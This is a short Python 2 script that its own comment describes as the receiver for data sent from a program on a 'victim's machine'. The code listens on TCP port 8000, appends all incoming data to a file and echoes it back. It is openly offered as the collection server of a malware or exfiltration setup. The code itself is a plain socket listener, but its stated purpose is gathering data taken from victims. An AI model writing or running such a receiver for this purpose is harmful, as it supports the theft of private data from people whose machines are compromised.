#!/usr/bin/env python
#This program is intended to receive the data being sent from the program "________" residing at victim's machine. It then saves the data to a file.
import thread
import socket

class RECEIVER:

	def __init__(self):        #.............................................constructor for the class RECEIVER
		tcpsocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		#tcpsocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		tcpsocket.bind(("0.0.0.0",8000))
		tcpsocket.listen(3)

		while True:           #..............................................Waits for a client recursively
			print "waiting for he client"
			(client, (ip,port)) = tcpsocket.accept()     #...................accepts a fresh or re-connection(max fresh connections 3)

			print "Receiving Data from client IP : ",ip  

			data="dummy"         #...........................................sets up dummy data to enter inner while loop
			fp=open("a.txt","a")     #.......................................open a file to save the contents being received
			while len(data) :        
				data=client.recv(2048)  #....................................receive data from a connection
				print "client sent ",data  
				fp.write(data)          #....................................print data onto a file
				client.send(data)       #....................................send the data as acknowledgement to the connection
                                        #....................................automatically exits the inner while loop when user closes connection
			print "closing connection"   
			client.close()       #...........................................closing connection from server side
			fp.close()           #...........................................closing the file
                        #....................................................recursively waits for another client
RECEIVER()
